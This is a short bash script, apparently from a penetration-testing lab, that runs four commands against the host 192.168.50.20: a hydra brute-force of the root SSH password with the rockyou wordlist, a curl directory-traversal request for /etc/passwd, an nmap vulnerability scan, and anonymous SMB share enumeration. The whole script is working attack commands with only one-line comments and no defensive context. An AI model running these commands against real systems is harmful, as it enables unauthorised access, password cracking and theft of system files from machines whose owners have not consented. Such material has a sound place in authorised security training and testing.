#!/usr/bin/env bash
set -euo pipefail

# SSH brute-force attempt against the root account using rockyou.txt.
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.50.20

# HTTP directory traversal request targeting /etc/passwd.
curl http://192.168.50.20/../../../../etc/passwd

# Nmap service/version detection and NSE vulnerability scan.
nmap -sV --script vuln 192.168.50.20

# Enumerate SMB shares anonymously while forcing SMBv3.
smbclient -L //192.168.50.20 -N -m SMB3
